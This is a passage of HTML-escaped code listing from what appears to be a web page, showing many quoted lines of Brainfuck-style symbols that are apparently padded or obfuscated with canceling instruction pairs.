&quot;+-&lt;&gt;-+--+--&gt;&lt;&gt;&lt;+--+&gt;&lt;--+&gt;&lt;&lt;&gt;&lt;&gt;+---&gt;&lt;+--&lt;&gt;&lt;&gt;&gt;&lt;-&gt;&lt;+-&gt;&lt;-+-&lt;&gt;-&gt;&lt;+-&gt;&lt;-++-&gt;&lt;&gt;-+-&lt;&gt;&lt;&gt;+-]+-&gt;&lt;&gt;&lt;&gt;&lt;&lt;&gt;&lt;-+&lt;&gt;+--+&quot;</span><br><span class="line">    &quot;[&lt;-+&lt;&gt;&gt;&lt;-++-+-++-&gt;&gt;&lt;[&lt;&gt;-+&lt;&gt;&lt;&gt;-&lt;&gt;+-&lt;&gt;&lt;&gt;]&gt;&lt;+-&gt;&lt;&gt;&lt;&gt;&lt;][-+&gt;+]&gt;&lt;&gt;&lt;&gt;&lt;,+-&gt;++&lt;&gt;-+&gt;&lt;++&lt;&gt;-+-++-&lt;&gt;+&gt;&lt;-+-++-+&gt;&lt;++&quot;</span><br><span class="line">    &quot;-&gt;&lt;+-+&gt;&lt;&lt;&gt;+&gt;&lt;-+&lt;&gt;+-+&gt;&lt;+-[&gt;&lt;&lt;&gt;&lt;-+-&lt;&gt;&gt;&lt;+--+---+--+&gt;&lt;&lt;&gt;-+-+-&gt;+-&lt;&gt;-+&lt;&gt;-&lt;&gt;&gt;&lt;+-&lt;&gt;+-]&lt;&gt;&lt;&gt;-+&gt;&lt;-+&lt;&gt;&lt;-++--&lt;&gt;-+&quot;</span><br><span class="line">    &quot;&gt;&lt;[&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;&lt;&lt;&gt;-++-&gt;&lt;++-&lt;&gt;&lt;&gt;&gt;&lt;+-&gt;-+&gt;&lt;&gt;&lt;&lt;&gt;&lt;&gt;[-&lt;&gt;][[+-[&lt;[&lt;[.[+.,.[-[&lt;[,-&lt;[&lt;&lt;.]&lt;+.&lt;]&lt;]+-[&gt;+,,]&gt;&gt;,]][&lt;-+&lt;&quot;</span><br><span class="line">    &quot;,&lt;+]-]-,&gt;[..,&gt;&gt;]].,]&gt;][&lt;&lt;&lt;[.&gt;+[[-&lt;[&gt;[&gt;&lt;.[[++&lt;[.&gt;,&lt;,]]-..[[-&gt;&gt;].,,.&gt;].+]+][,,&gt;,-&lt;-]&lt;..]&gt;]-,.&gt;+].&gt;&gt;]]+&quot;</span><br><span class="line">    &quot;]-+]&lt;&gt;+-&gt;&lt;,&gt;&lt;&gt;+&lt;&gt;-+&lt;&gt;+-&gt;&lt;+-+&lt;&gt;&gt;&lt;&gt;&lt;+&lt;&gt;&lt;&gt;&gt;&lt;-+&lt;&gt;+&lt;&gt;++-&lt;&gt;-++-++-+-+-+-++&gt;&lt;+&lt;&gt;+&gt;&lt;[&lt;&gt;+--+&lt;&gt;&lt;-&lt;&gt;&gt;&lt;-+-+-&gt;&lt;-+&quot;</span><br><span class="line">    &quot;&gt;&lt;&gt;&lt;-+-&gt;&lt;&gt;&lt;-+&lt;&gt;-&gt;&lt;+--&gt;&lt;&gt;&lt;&gt;&lt;&gt;-++--+-][&gt;..&gt;,&lt;&gt;]+-&lt;&gt;&lt;-+-+-&lt;&gt;&lt;&gt;&lt;&gt;+---+-&gt;&lt;+-&gt;&lt;--+-&lt;&gt;-++-&gt;&lt;[-+&gt;&lt;+-&lt;++-&gt;-+&gt;&quot;</span><br><span class="line">    &quot;&lt;[+-&gt;&lt;-+--+&gt;&lt;+-&gt;&lt;&gt;&lt;][,--[-[-[.,-]&lt;--],]]][-[&gt;.[[&gt;&lt;++,,+&lt;]+.&lt;],&gt;.]&gt;--]+-&gt;&lt;-+-+,&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;&lt;&gt;-++&lt;&gt;&lt;&gt;+-&quot;</span><br><span class="line">    &quot;+&lt;&gt;&gt;&lt;-+-++&gt;&lt;&lt;&gt;+-+-+-++-++-+&lt;&gt;++-++--++-++-&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;+-+[&gt;&lt;+-+-+-&gt;&lt;&lt;+-&gt;&lt;&gt;&lt;&gt;&lt;---&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;--+-&lt;&gt;+--+-+-+--&quot;</span><br><span class="line">    &quot;-+&gt;&lt;-+--+--+-&gt;&lt;&gt;&lt;&gt;-&lt;&gt;&gt;&lt;-++-&gt;&lt;][&lt;&gt;[&lt;&gt;+[.[,++.]&gt;]]-,-]+-&lt;&gt;&lt;&gt;&lt;-+-[&lt;-+&lt;&gt;-+&gt;&lt;+&gt;&lt;+-+--+&gt;+-&gt;&lt;[-+&lt;&gt;-&lt;&gt;][.[+,&quot;</span><br><span class="line">    &quot;+-&gt;-[&lt;[&gt;-[-.&lt;,&lt;&gt;&gt;].+,]&gt;]]+&gt;[.&gt;&lt;[.&gt;],.-[,&gt;-[[-&lt;[-&gt;,]-&lt;+]&lt;,&lt;&gt;]&lt;+&lt;]]]&lt;&gt;&gt;&lt;-+&lt;&gt;]&gt;&lt;+-&gt;&lt;,-+&gt;&lt;&lt;&gt;&gt;-+++-+&lt;&gt;-+&gt;&quot;</span><br><span class="line">    &quot;&lt;+-++--+&gt;&lt;++-+-&lt;&gt;-+&lt;&gt;++&lt;&gt;+-&lt;&gt;+-+&gt;&lt;+-+-&gt;&lt;+&gt;&lt;&lt;&gt;-+-+-++-+&gt;&lt;+-+-++-&lt;&gt;&gt;&lt;[&gt;&lt;+-&lt;&gt;&lt;-+&gt;&lt;+--+-&gt;&lt;-&lt;&gt;-+-&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;&quot;</span><br><span class="line">    &quot;--+-+-&gt;&lt;&gt;&lt;&gt;&gt;&lt;-+-&lt;&gt;][&gt;&gt;[++,-+&gt;&lt;&lt;]-.,]-++-&lt;&gt;&gt;&lt;&lt;&gt;&lt;&gt;&lt;+-&gt;&lt;--+-+-&lt;&gt;-++-+--&lt;&gt;&lt;&gt;&gt;&lt;-+-&lt;&gt;+-&lt;&gt;&lt;&gt;[-+-+-+&gt;&lt;&lt;&lt;&gt;+-+&quot;</span><br><span class="line">    &quot;+-&gt;+--+&lt;&gt;[&gt;&lt;+-&gt;&lt;&gt;&lt;-+--+&lt;&gt;&lt;&gt;-+]&lt;&gt;][+[+&lt;,+[[+.[+&gt;&lt;[&lt;][&gt;&lt;++[-+[&lt;,[[.&gt;,&gt;-]&gt;&lt;+],&lt;].-+--]..],,-],&lt;+]++&gt;-]&gt;&quot;</span><br><span class="line">    &quot;,,].&gt;.]&gt;&lt;,&gt;+-+-+-+&gt;&lt;+-+-+-+++&lt;&gt;+&lt;&gt;++-+-&gt;&lt;&lt;&gt;-++&lt;&gt;+-+-+-++-++-&gt;&lt;+-&lt;&gt;[&gt;&lt;-++-&gt;&lt;&lt;&lt;&gt;-+---+---+&gt;&lt;&gt;&lt;+-&gt;&lt;-&gt;&lt;+&quot;</span><br><span class="line">    &quot;--+--+&lt;&gt;+---+-+&gt;&lt;-+-+--&lt;&gt;&gt;&lt;-+&gt;&lt;--++-&gt;&lt;-&gt;&lt;+-+-+-&gt;-+&gt;&lt;-&gt;&lt;&lt;&gt;]&lt;&gt;&gt;&lt;&gt;&lt;&lt;-++-+-&gt;&lt;+--+--+-+&gt;&lt;-[&gt;&lt;&lt;-++&gt;&lt;&gt;&gt;&lt;&lt;&gt;+&quot;</span><br><span class="line">    &quot;-&gt;&lt;&gt;&lt;[&gt;&lt;-+--+]+-][+.[--,&gt;-++],]-+&lt;&gt;-++-,-+&lt;&gt;+-&lt;&gt;&gt;&lt;&gt;&lt;&gt;+-&lt;&gt;&gt;&lt;-+++&gt;&lt;&lt;&gt;+-+&lt;&gt;+-&lt;&gt;+-+&gt;&lt;-+&gt;&lt;+-+&lt;&gt;+-++++-[&lt;-&quot;</span><br><span class="line">    &quot;+-+--++--+--+-+&gt;&lt;--&gt;&lt;+-&gt;&lt;-+--+--+-+&gt;+---+&gt;&lt;+-][,.-[.,+[+-&lt;[,[,+[.&gt;[-&gt;+[[+[-&gt;&lt;],[--+,-]&gt;&lt;-][.+,&lt;[,+.&gt;&quot;</span><br><span class="line">    &quot;..]]]]+.-,-]&lt;,+-]&lt;&gt;&gt;[+[[,-.-+,].+]&lt;+.]-,&lt;]+&gt;]-[[&lt;[&lt;.,&lt;+,][&lt;-+[-[&lt;&lt;&gt;[&gt;+&lt;&lt;++&lt;]-+],]+-]],,-&gt;-]&lt;&lt;&gt;]&gt;+&lt;]+&quot;</span><br><span class="line">    &quot;-&lt;&gt;+-&lt;&gt;&lt;&gt;&lt;+--&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;--+-&lt;&gt;+-+-&gt;&lt;&gt;&lt;--&lt;&gt;-++--+--+-[+--+-+&lt;&gt;&lt;&lt;&gt;&lt;&gt;-++&lt;&gt;-++--+&lt;&gt;&gt;[+-+--+&lt;&gt;-+-&lt;&gt;&gt;&lt;&lt;&gt;&lt;&gt;&gt;&lt;]&quot;</span><br><span class="line">    &quot;&gt;&lt;]&gt;&lt;,&gt;&lt;&gt;+-&lt;&gt;&gt;&lt;&lt;&gt;++-+&gt;&lt;-+&lt;&gt;+-++-+&lt;&gt;-+&lt;&gt;++--+&gt;&lt;-+[+-+-&lt;&gt;&gt;&lt;&lt;&lt;&gt;&gt;&lt;-++---++--+-+-&gt;&lt;-+-&gt;&lt;-&lt;&gt;+-&gt;&lt;--+-&gt;&lt;&gt;&lt;&lt;&gt;&quot;</span><br><span class="line">    &quot;--+&lt;&gt;&lt;&gt;&gt;&lt;-&lt;&gt;&lt;&gt;&lt;&gt;-++--+-&gt;&lt;-&gt;&lt;-+--+-&gt;&lt;-&gt;&lt;+--&lt;&gt;&gt;&lt;--++--&lt;&gt;&gt;&lt;-+&gt;&lt;+----++-&gt;&lt;&lt;&gt;&gt;&lt;-+-&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;--+&gt;&lt;&lt;&gt;&lt;&gt;&gt;-&lt;&gt;-+&quot;</span><br><span class="line">    &quot;&gt;&lt;]-+-+&lt;&gt;&lt;+--+-+&lt;&gt;[&gt;&lt;+-&lt;&gt;&lt;+-&gt;&lt;-++-+&lt;&gt;+-&lt;&gt;&gt;+-&lt;&gt;&gt;&lt;&lt;&gt;[--+-++-+-&lt;&gt;]&lt;&gt;-+&gt;&lt;&gt;&lt;][.+.+],+-&gt;&gt;&lt;&gt;&lt;&gt;&lt;-+&lt;&gt;++&gt;&lt;&gt;&lt;+-&quot;</span><br><span class="line">    &quot;+-+&gt;&lt;&gt;&lt;-+++-+-+-&gt;&lt;+&gt;&lt;-+-+&gt;&lt;-+++-++-+-&lt;&gt;+&gt;&lt;+-+-&gt;&lt;&gt;&lt;+&lt;&gt;&gt;&lt;+&lt;&gt;[&lt;&gt;-+&lt;&gt;&lt;&gt;&lt;--&gt;&lt;&lt;&gt;&gt;&lt;-+--+-&lt;&gt;-+-&lt;&gt;&lt;&gt;&lt;&gt;&gt;-++--+&quot;</span><br><span class="line">    &quot;-&gt;&lt;][&gt;-,[&gt;.+&lt;--]&lt;.[+[&lt;&lt;[&lt;[--&lt;[&gt;&lt;-&lt;],.[[-&gt;,.],&gt;&gt;]&lt;.+].+-,]++]+[&gt;,[-+[[[+-&lt;&gt;&gt;&lt;.]&lt;-].-,]+-,]]&gt;]&gt;]+-&lt;+-&lt;&quot;</span><br><span class="line">    &quot;&gt;-+-+--+&gt;&lt;-[&gt;&lt;-++-&lt;-+&lt;&gt;-++-++-&gt;-+&lt;&gt;[+--+-&gt;&lt;&lt;&gt;][++--[.,&gt;+--[.&lt;,[&gt;,[,[[-&gt;[[[--&gt;--.]&gt;+-,-]&gt;.&gt;]],[.&gt;[-+,&quot;</span><br><span class="line">    &quot;[&lt;.,&gt;[+&lt;&gt;,,+&lt;&lt;.],+]]--[+.&gt;&lt;,[&gt;-,[+,]--&gt;]+.].,&lt;]]+]++].[&lt;+.].,+].&gt;-],+]&gt;&lt;&lt;&gt;]&gt;&lt;&lt;&gt;,&gt;&lt;&lt;&gt;&gt;&lt;&gt;+-+-+&lt;&gt;&lt;&gt;++-+&quot;</span><br><span class="line">    &quot;&gt;&lt;-+&gt;&lt;+-++--++&gt;&lt;-++-&gt;&lt;+&lt;&gt;&lt;&gt;&gt;&lt;-++-+&lt;&gt;+[&lt;&gt;&lt;+--+-&gt;&lt;-+-&gt;&lt;-+---+-+--++--&gt;&lt;-+-&lt;&gt;&lt;&gt;-+&gt;&lt;-+--+&gt;&lt;-+-+-&lt;&gt;-&gt;&lt;-++&quot;</span><br><span class="line">    &quot;-&gt;&lt;-+--+-&gt;&lt;&gt;--+]&lt;+-&lt;&gt;&lt;&gt;-&lt;&gt;-+&gt;&lt;&lt;&gt;-+-&lt;&gt;--++-[&gt;&lt;-+&gt;&lt;&gt;&lt;&lt;&gt;&lt;&gt;&lt;+&gt;&lt;&lt;&gt;+-&gt;&lt;&gt;+-+-[-++-&lt;&gt;&lt;&gt;-+-+--+]+-&lt;&gt;&gt;&lt;&lt;&gt;],&gt;&lt;+&quot;</span><br><span class="line">    &quot;-&gt;&lt;-+-+&gt;+&gt;&lt;+-&lt;&gt;-++&lt;&gt;++--++-++-+&gt;&lt;&gt;&lt;&lt;&gt;+-++-&lt;&gt;[&lt;&gt;+-&lt;&gt;&lt;-+-&gt;&lt;-+&lt;&gt;&gt;&lt;-+--+&gt;&lt;&lt;&gt;---&gt;&lt;+--+&lt;&gt;&gt;&lt;--+&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;-&gt;&lt;&gt;&quot;</span><br><span class="line">    &quot;&lt;+--&lt;&gt;-+-&gt;--+&gt;&lt;+-&gt;&lt;]+--+&gt;&lt;&lt;&lt;&gt;--+-+-+-+--+&gt;&lt;-+&gt;&lt;-&lt;&gt;-+[&lt;&gt;&gt;&lt;-+&lt;&lt;&gt;-++&lt;&gt;&lt;&gt;&lt;&gt;-+&gt;[-+-&gt;&lt;+--+][[-&gt;&gt;[+&lt;.[&gt;&gt;-].&quot;</span><br><span class="line">    &quot;&lt;,&lt;],]-+&lt;]&gt;&lt;]&lt;&gt;&lt;&gt;&lt;&gt;+--+,&gt;&gt;&lt;-+&lt;&gt;+--+++-+-+-+&gt;&lt;+-&gt;&lt;+-+-++-&gt;&lt;+&lt;&gt;+-+-+-+-+-+&lt;&gt;+-+-+-+&lt;&gt;++&lt;&gt;&lt;&gt;-+[&gt;&lt;&lt;&gt;+-&lt;&lt;&quot;</span><br><span class="line">    &quot;&gt;&gt;&lt;&lt;&gt;+--+--&lt;&gt;+-+--+-&lt;&gt;+-&lt;&gt;-+-+-&lt;&gt;-&gt;&lt;&gt;&lt;-&gt;&lt;&lt;&gt;+-&lt;&gt;&gt;+-&lt;&gt;-+-][&lt;-++&lt;.-&gt;]&lt;&gt;+-&gt;&lt;&gt;&lt;-+&lt;+-+-[&lt;&lt;&gt;-++--++&lt;&gt;&gt;&lt;&gt;&gt;&lt;&lt;&quot;</span><br><span class="line">    &quot;&gt;-+[&gt;&lt;-++-+--+-+-&lt;&gt;+--+][[&lt;+,[&gt;&lt;+.]+]+.[&lt;[.-&gt;&lt;]-+&gt;-],]&gt;&lt;+-&gt;&lt;-++-]&gt;&lt;&gt;&lt;,&lt;&gt;&lt;&gt;&lt;&gt;&gt;++-+-+-&lt;&gt;+-+-++-++-+-&gt;&lt;&quot;</span><br><span class="line">    &quot;+-++--++-+-+[+-+-+--++-&lt;-&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&lt;&gt;--+&gt;&lt;--&gt;&lt;-++--+-&lt;&gt;+--+-+-&gt;&lt;&lt;&gt;+-&gt;&lt;-+-&lt;&gt;&lt;&gt;+-+--&gt;&lt;-+-&lt;&gt;-+-+-&lt;&gt;-&gt;&lt;&gt;-+&quot;</span><br><span class="line">    &quot;-]-+&lt;-&lt;&gt;-+-+[&gt;&lt;&gt;&lt;+-&lt;+-+&lt;&gt;&gt;+-&gt;&lt;&lt;&gt;-+[+-&gt;&lt;&gt;&lt;+--]]-+-+&gt;&lt;-+-+,+-&gt;&lt;&gt;+--++-+&gt;&lt;&gt;&lt;&lt;&gt;&gt;&lt;+&lt;&gt;&gt;&lt;++-+&lt;&gt;+-++-+[&gt;&lt;&lt;&gt;+&quot;</span><br><span class="line">    &quot;-&lt;-+&lt;&gt;-&lt;&gt;&lt;&gt;-++-&gt;&lt;-&lt;&gt;&lt;&gt;+--+--+&lt;&gt;+--++--+-&lt;&gt;&lt;&gt;&lt;&gt;--+&lt;&gt;-++---+-&gt;&lt;-&lt;&gt;+-&gt;-+-&lt;&gt;&lt;&gt;][[--,[&lt;&lt;-[&gt;[,&gt;.[.,-[.+[&lt;,&quot;</span><br><span class="line">    &quot;&lt;-.[-+-],]&gt;]++.],&gt;&lt;],,,]&lt;.-+,].&lt;]-[&gt;+-[.-&lt;,],,.[&lt;[&lt;-,--+-++]+-.+]-]&lt;-+]&lt;&gt;-+&lt;-&lt;&gt;+-+--+-+--+--++--[&lt;&gt;-&quot;</span><br><span class="line">    &quot;+&gt;&lt;&gt;&lt;&lt;++-&lt;&gt;+-&gt;&lt;&gt;&gt;&lt;-+[+-&gt;&lt;-+&gt;&lt;&gt;&lt;-][+--.&lt;]+--+&lt;&gt;&gt;&lt;&gt;&lt;]-++-,+-&gt;-++-&lt;&gt;&gt;&lt;&lt;&gt;+++&gt;&lt;+-+-+&lt;&gt;+++-+++&gt;&lt;+-&gt;&lt;&gt;&lt;&lt;&gt;[-&quot;</span><br><span class="line">    &quot;+&lt;&gt;&gt;&lt;&lt;&lt;&gt;+--+-+---+-+&lt;&gt;-+-&lt;&gt;&gt;&lt;&gt;&lt;--&lt;&gt;+-&gt;&lt;-&lt;&gt;-+-+&gt;&lt;-&gt;&lt;&gt;&lt;+-+-&lt;&gt;--++-&lt;&gt;&lt;&gt;---+-&gt;+--+-++--+-&lt;&gt;-+&lt;&gt;+-]&gt;&lt;-+&lt;+&quot;</span><br><span class="line">    &quot;-&gt;&lt;-&gt;&lt;+---+&gt;&lt;+-[&lt;-++&lt;&gt;&gt;&lt;+-+-&gt;&gt;&lt;&gt;&lt;[-+-+-]][[[&gt;&gt;+[.]&gt;++-]]-.]&lt;&gt;&gt;&lt;,&gt;&lt;&lt;&gt;-+-+&gt;&lt;&gt;-+&lt;&gt;&lt;&gt;+&lt;&gt;&gt;&lt;++-+-+-&gt;&lt;&lt;&gt;+&gt;&lt;&quot;</span><br><span class="line">    &quot;+-+&gt;&lt;+&lt;&gt;+-+&gt;&lt;+-&gt;&lt;+&lt;&gt;-++&gt;&lt;-++-[-+-+&lt;&gt;&lt;-+---++---&lt;&gt;-&lt;&gt;-+&lt;&gt;&gt;&lt;&lt;&gt;-&lt;&gt;&gt;&lt;-&gt;&lt;&lt;&gt;&gt;&lt;-+-+---+&lt;&gt;&gt;&lt;--+-+-+-&gt;&lt;&gt;&lt;+-+-&quot;</span><br><span class="line">    &quot;-+-&gt;&lt;+-&gt;&lt;&gt;&gt;&lt;&lt;&gt;-++-&lt;&gt;-&gt;&lt;&lt;&gt;+-&gt;&lt;&lt;&gt;]+--+&lt;&gt;&lt;+---+-&gt;&lt;&lt;&gt;-++----+-+&gt;&lt;--+-+&lt;&gt;+---+&lt;&gt;&gt;&lt;&gt;&lt;-+[+--+-+-+&gt;&lt;&lt;+&gt;&gt;&lt;&gt;&lt;[&quot;</span><br><span class="line">    &quot;-+&lt;&gt;-+&gt;&lt;+--+-+-]-++-+-][&gt;-[.+&lt;[&lt;-+&gt;.]+.&lt;[[&gt;,[[+.+&gt;]-&lt;.]+-+[+,&gt;,&gt;-,+-]]]]&gt;,-[&gt;-&lt;[-,&lt;-&gt;[&lt;.&gt;[+.[.-+]&gt;,[&quot;</span><br><span class="line">    &quot;,[.-]&gt;]&gt;]+&gt;[[&gt;-,]+-+].]],&lt;[&lt;&lt;..-&gt;&lt;].]]-+,-+&gt;&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;+-+&lt;&gt;&gt;&lt;-++-+&lt;&gt;+-&lt;&gt;+&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;+-++-&gt;&lt;-+&gt;&lt;-++++&gt;&lt;+-+&quot;</span><br><span class="line">    &quot;&gt;&lt;&lt;&gt;&lt;&gt;+-+-+&lt;&gt;+-++-+-&lt;&gt;&lt;&gt;[-+&lt;&gt;&gt;&lt;&gt;&lt;-+&lt;&lt;&gt;+--&lt;&gt;&lt;&gt;-+-+---+-+--&lt;&gt;&lt;&gt;&gt;&lt;&lt;&gt;-+&gt;+-&lt;&gt;+-&lt;&gt;-&lt;&gt;&lt;&gt;&gt;&lt;][[.[&gt;&gt;-[.&gt;.[[..[&quot;</span><br><span class="line">    &quot;+,,]&lt;.&gt;[..&lt;&gt;+..]+&lt;]&lt;&gt;]+-]&gt;&gt;&gt;[[--,-],+&gt;.-]-.]&gt;]+-]&lt;-+-[+-&lt;&lt;&gt;&gt;&lt;&gt;&lt;+&gt;+-[-+&lt;&gt;&lt;&gt;&lt;&gt;-+-&lt;&gt;+-+-+-]&gt;&lt;+-+-&lt;&gt;],&gt;&lt;&quot;</span><br><span class="line">    &quot;+--+&gt;-+&gt;&lt;+-&lt;&gt;++-++-+&gt;&lt;-+++-+-&gt;&lt;+&gt;&lt;-++-&lt;&gt;+&gt;&lt;&lt;&gt;+-&lt;&gt;-+++-&lt;&gt;&gt;&lt;+&gt;&lt;&lt;&gt;&gt;&lt;+-+&gt;&lt;-+&lt;&gt;-+[&lt;&gt;&lt;-&lt;&gt;-+-+-&gt;&lt;&gt;&lt;+--+--+&gt;&quot;</span><br><span class="line">    &quot;&lt;-+-+-+-&lt;&gt;&gt;&lt;+-+--&lt;&gt;&lt;&gt;&gt;&lt;&gt;&lt;+-&gt;-++---+-++-][,[.[...&lt;,&lt;&lt;+,]]-.]+-&lt;&gt;-+-+&lt;&gt;&lt;-+&lt;&gt;&gt;&lt;&lt;&gt;-&gt;&lt;-&lt;&gt;+-&gt;&lt;---&lt;&gt;--&lt;&gt;-+-&quot;</span><br><span class="line">    &quot;++-+--[&gt;&lt;&lt;++-+--+-++-&gt;-+&gt;&lt;-+&gt;&lt;+-[-+-]]+-&lt;&gt;,+-+-&gt;++-+-&gt;&lt;-+&gt;&lt;+&lt;&gt;&gt;&lt;&gt;&lt;-+-++&lt;&gt;&gt;&lt;&lt;&gt;+&lt;&gt;&gt;&lt;-++&lt;&gt;-+&gt;&lt;+++-&gt;&lt;+-+&quot;</span><br><span class="line">    &quot;-&gt;&lt;+&lt;&gt;+-+&lt;&gt;&lt;&gt;+&lt;&gt;&lt;&gt;[+-&gt;&lt;&lt;-+&lt;&gt;+-&lt;&gt;-&gt;&lt;&gt;&lt;&lt;&gt;-+&gt;&lt;-&gt;&lt;--+-&lt;&gt;&lt;&gt;-+-+-&gt;&lt;&gt;+-&gt;&lt;&lt;&gt;--+&gt;&lt;+-&lt;&gt;-+][[,.-,.]]+-&gt;&lt;-+&lt;&lt;&gt;+-&quot;</span><br><span class="line">    &quot;&gt;&lt;&lt;&gt;&lt;&gt;-+-&gt;&lt;--+---+-++--&lt;&gt;&gt;&lt;&gt;&lt;&lt;&gt;&lt;&gt;--++--+-&lt;&gt;-+&lt;&gt;&lt;&gt;[&lt;-+&lt;&gt;&lt;&gt;&lt;&gt;+&gt;-+&gt;&lt;&gt;&lt;&lt;&gt;-+[-&gt;&lt;-+]&lt;&gt;&lt;&gt;&lt;&gt;+-&gt;&lt;][..,[,.[-&gt;&lt;&quot;</span><br><span class="line">    &quot;.&lt;]-,[[&lt;&gt;&gt;[&gt;[&gt;,&lt;[&gt;&gt;+,[+[[-,-+]&lt;]&gt;,[++[&lt;,&gt;&gt;+-&lt;][&gt;],&gt;]-&gt;&gt;].],&lt;],+.,]-,[-[&gt;,,+][+[[&lt;&gt;],&lt;&gt;]].-]-&gt;,]]&lt;+&gt;]&quot;</span><br><span class="line">    &quot;+[&gt;&lt;&gt;+.&gt;&lt;]-]&lt;&gt;-+&gt;&lt;+-,+-+--+-+&gt;&lt;&gt;+-+&gt;&lt;-+&gt;&lt;+&gt;&lt;-++-&gt;&lt;+-+-++--++++--++&gt;&lt;-++-++&gt;&lt;&lt;&gt;-+-+-+[-+-+&lt;&lt;&gt;-&gt;&lt;&gt;&lt;+-&gt;&quot;</span><br><span class="line">    &quot;&lt;&lt;&gt;-+-&gt;&lt;+--+-+--+&lt;&gt;&lt;&gt;--+&gt;&lt;+-+-&lt;&gt;-&gt;&lt;&lt;&gt;-&lt;&gt;+-&lt;&gt;+--+---+&lt;&gt;&lt;&gt;+--&lt;&gt;+--+-&lt;&gt;--+&lt;&gt;-+-&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&lt;&gt;&gt;&lt;&gt;&gt;&lt;&gt;&lt;+--&gt;&lt;&gt;&lt;&quot;</span><br><span class="line">    &quot;-+&gt;&lt;][&gt;+&gt;--]&gt;&lt;-+-+&lt;-++--+-&gt;&lt;&gt;&lt;--+-&lt;&gt;+-&lt;&gt;-++-[-++-&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;+&lt;&gt;&gt;[-+&gt;&lt;&gt;&lt;-+-+-&gt;&lt;-+-++-]&gt;&lt;&lt;&gt;][,,+-&gt;-+]&lt;&gt;&lt;&quot;</span><br><span class="line">    &quot;&gt;-+-+,+-&lt;&gt;-+-+-+&gt;&lt;&gt;+-&gt;&lt;+&gt;&lt;+-+-+&gt;&lt;+&lt;&gt;&gt;&lt;++-&lt;&gt;&lt;&gt;+-+-+&gt;&lt;+--++-++-++-++-+[&lt;&gt;&lt;&gt;&lt;&gt;&lt;+--+-&lt;&gt;+---&lt;&gt;&lt;&gt;-+&lt;&gt;-&gt;&lt;--&quot;</span><br><span class="line">    &quot;+&gt;&lt;&lt;&gt;+-&lt;&gt;&gt;&gt;&lt;-+-+-&lt;&gt;-+]-+&lt;&gt;+-+-+-&lt;--+&lt;&gt;--&gt;&lt;-+&lt;&gt;--&lt;&gt;+-&lt;&gt;&lt;&gt;-&gt;&lt;&lt;&gt;+-[-+&lt;-++--+&lt;&gt;+&lt;&gt;-+&gt;&lt;&gt;&gt;&lt;-+&lt;&gt;&lt;&gt;[-+&lt;&gt;&gt;&lt;+-&quot;</span><br><span class="line">    &quot;-+-+--+&lt;&gt;]&lt;&gt;]+--+,&gt;&gt;&lt;-+&gt;&lt;+&lt;&gt;&gt;&lt;+&gt;&lt;++-+&lt;&gt;+-&gt;&lt;++--++&lt;&gt;&lt;&gt;[&gt;&lt;+--+&lt;&gt;&lt;&lt;&gt;--+&lt;&gt;&gt;&lt;-&gt;&lt;&lt;&gt;&lt;&gt;+-&gt;&lt;-+-&lt;&gt;-&lt;&gt;-+-+-+--+&quot;</span><br><span class="line">    &quot;-+-+---+-++--&lt;&gt;&lt;&gt;&gt;&lt;-+---+&gt;&lt;-+&gt;&lt;&lt;&gt;-&lt;&gt;-+&gt;&lt;&lt;&gt;--+---&gt;&lt;&lt;&gt;-&lt;&gt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;-&lt;&gt;+-]&lt;&lt;&gt;&gt;&lt;+--&gt;&lt;---&lt;&gt;&gt;&lt;+--+[+-&lt;&gt;&gt;&lt;&lt;+&quot;</span><br><span class="line">    &quot;&gt;&lt;-+&lt;&gt;&lt;&gt;&gt;&gt;&lt;-+&gt;&lt;-+[-+--+&gt;&lt;+-]&gt;&lt;][[[-+,.],.,-].&lt;,[&lt;,+[&gt;...[&lt;&lt;,[+[,&gt;&gt;[+.-[.+[[&lt;,+][,&lt;,+-&gt;&lt;]&lt;&gt;].,,&gt;][&gt;,.&quot;</span><br><span class="line">    &quot;.]+&lt;]-+],,]]&lt;]+,.]]+-+-&lt;&gt;+-,+-+-&gt;&lt;&gt;&lt;&gt;&lt;&gt;+&gt;&lt;&gt;&lt;+-++-+-++&gt;&lt;&gt;&lt;+-&gt;&lt;&lt;&gt;++-&lt;&gt;++-&gt;&lt;-++-+-[&gt;&lt;&lt;&gt;+-&lt;+-+-+-&gt;&lt;+----&quot;</span><br><span class="line">    &quot;-+-+---+-+--++--&lt;&gt;+-&gt;&lt;&gt;&lt;-+-&gt;&lt;+----+&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;--+--&gt;&lt;--+-+&gt;&lt;-+-&lt;&gt;+-&gt;&lt;-+-+-&gt;-]&gt;&lt;&gt;&lt;-+&lt;&lt;&gt;+--+-&lt;&gt;&lt;&gt;--+-+-++&quot;</span><br><span class="line">    &quot;---++--+-+-&lt;&gt;+-&lt;&gt;&gt;&lt;-+-&lt;&gt;[&lt;&gt;&gt;&lt;&lt;&gt;&lt;-+&lt;&gt;+--+++-&gt;&lt;&gt;&lt;&gt;[-+-+-&gt;&lt;][&lt;.[&lt;&gt;[.[,-,[.,,]&lt;-+[&gt;[.[,[-[[.&gt;&lt;][-&gt;+&lt;].&gt;]&quot;</span><br><span class="line">    &quot;&gt;&lt;&gt;[[&gt;&lt;,]-.&lt;[&lt;,+..]]+&gt;-]&gt;&gt;[&lt;[-.&gt;-&lt;[+&lt;+&gt;,].&lt;]&lt;[--[&gt;-]],]&gt;]&gt;&gt;[[&gt;.+++]-+++.]].,&gt;-&lt;]&gt;+]&gt;&lt;+]&lt;&gt;-[+++[,,&lt;[,&quot;</span><br><span class="line">    